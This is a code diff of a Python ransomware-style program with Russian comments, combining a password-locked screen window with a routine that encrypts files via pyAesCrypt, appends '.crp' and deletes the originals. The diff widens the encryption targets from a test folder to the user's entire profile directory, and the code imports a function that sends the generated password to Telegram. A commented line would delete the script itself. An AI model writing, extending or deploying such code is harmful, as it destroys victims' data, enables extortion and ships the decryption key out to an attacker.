@@ -10,7 +10,10 @@ from time import sleep
 
 from send_password import send_password_to_telegram
 
-direct = r"C:\test"
+user_path = os.path.join(os.environ["USERPROFILE"])
+
+# Список директорий для шифрования
+directories = [r"C:\\test1", r"C:\\test", user_path]
 
 def generate_password(length=12):
     # Набор символов для генерации пароля
@@ -33,6 +36,7 @@ def locker():
             sites = file.read().strip().splitlines()  # Читаем строки и разделяем их
     except FileNotFoundError:
         sites = ["Файл sites.txt не найден."]
+
     def callback(event):
         global k
         if entry.get() == locker_pass:
@@ -41,8 +45,6 @@ def locker():
     def block():
         try:
             pass
-            # click(675, 420)  # Кликать на координаты 675 420
-            # moveTo(675, 420)  # Перемещать курсор на координаты 675 420
         except FailSafeException:
             pass
 
@@ -84,20 +86,33 @@ def locker():
 
 def crypter():
     def crypt(file):
-        password = crypt_pass
-        bufferSize = 512 * 1024
-        pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
-        os.remove(file)
+        try:
+            password = crypt_pass
+            bufferSize = 512 * 1024
+            pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
+            os.remove(file)
+        except OSError as e:
+            print(f"Ошибка при обработке файла {file}: {e}")
+        except ValueError as e:
+            print(f"Невозможно прочитать файл {file}: {e}")
 
     def walk(dir):
-        for name in os.listdir(dir):
-            path = os.path.join(dir, name)
-            if os.path.isfile(path):
-                crypt(path)
-            else:
-                walk(path)
+        try:
+            for name in os.listdir(dir):
+                path = os.path.join(dir, name)
+                if os.path.isfile(path) and path.endswith(".py"):
+                    crypt(path)
+                elif os.path.isdir(path):
+                    walk(path)
+        except FileNotFoundError:
+            print(f"Директория {dir} не найдена. Пропускаем...")
+        except PermissionError:
+            print(f"Нет доступа к директории {dir}. Пропускаем...")
 
-    walk(direct)
+    for directory in directories:
+        print(f"Начинаем шифрование в {directory}...")
+        walk(directory)
+
     print("Encryption complete.")
     # os.remove(sys.argv[0])
 
